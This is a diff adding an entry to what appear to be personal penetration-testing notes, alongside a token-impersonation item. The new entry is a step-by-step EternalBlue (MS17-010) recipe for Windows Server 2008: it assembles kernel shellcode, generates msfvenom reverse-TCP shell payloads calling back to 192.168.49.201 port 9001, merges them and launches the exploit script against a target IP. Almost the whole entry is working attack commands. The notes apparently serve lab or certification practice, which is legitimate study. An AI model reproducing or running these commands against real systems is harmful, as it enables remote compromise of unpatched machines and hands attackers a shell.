@@ -1482,6 +1482,23 @@ Windows Server 2003 SP2
          SeImpersonatePrivilege enabled
          https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
          Possible Token HIjacking
+
+
+MS17-010 Ethernal Blue
+	Windows Server(R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
+	Using https://github.com/worawit/MS17-010
+		In shellcode folder
+		nasm -f bin eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin 
+		nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin 
+		msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.201 LPORT=9001 -f raw -o sc_x86_msf.bin EXITFUNC=thread 
+		msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.201 LPORT=9001 -a x64 -f raw -o sc_x64_msf.bin EXITFUNC=thread 
+		cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin 
+		cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin 
+		python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin 
+		python eternalblue_exploit7.py <IP> ./shellcode/sc_all 
+
+
+   
    
    
 MSF basic listener
